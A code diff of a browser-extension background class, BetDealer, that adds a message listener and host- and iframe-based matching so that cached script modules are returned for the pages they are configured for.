@@ -1,14 +1,24 @@
 'use strict';
 
+import { iframeResolver, hostResolver } from './resolvers';
+
 class BetDealer {
   constructor (bg) {
     this.bg = bg;
     this.listeners = 0;
   }
 
+  send (msg, cb) {
+    this.runtime.sendMessage(null, msg, null, cb);
+  }
+
   addListener () {
     this.listeners += 1;
-    console.log('Listen incoming messages.');
+    this.runtime.onMessage.addListener((message, sender, sendResponse) => {
+      console.log('message', message);
+      this.processMessage(message, this.appId, sendResponse);
+      return true;
+    });
   }
 
   processMessage (message, id, sendResponse) {
@@ -53,16 +63,19 @@ class BetDealer {
 
     config.forEach((part) => {
       if (
-        part.h
+        iframeResolver(part.f, payload.isFrame)
         &&
-        new RegExp(part.h).test(payload.host)
+        hostResolver(part.h, payload.host)
         &&
-        part.l
-        &&
-        part.l.length
+        Array.isArray(part.l)
       ) {
         part.l.forEach((l) => {
-          modules.push(this.bg.cache.modules.get(l));
+          if (this.bg.cache.modules.has(l)) {
+            modules.push({
+              exec: part.r || 1,
+              text: this.bg.cache.modules.get(l),
+            });
+          }
         });
       }
     });
@@ -71,10 +84,7 @@ class BetDealer {
   }
 
   getConfig () {
-    // if (this.bg.cache.config.has('config')) {
-    //   throw new Error('No config');
-    // }
-    return this.bg.cache.config.get('config');
+    return this.bg.cache.config.get('config') || [];
   }
 }
 
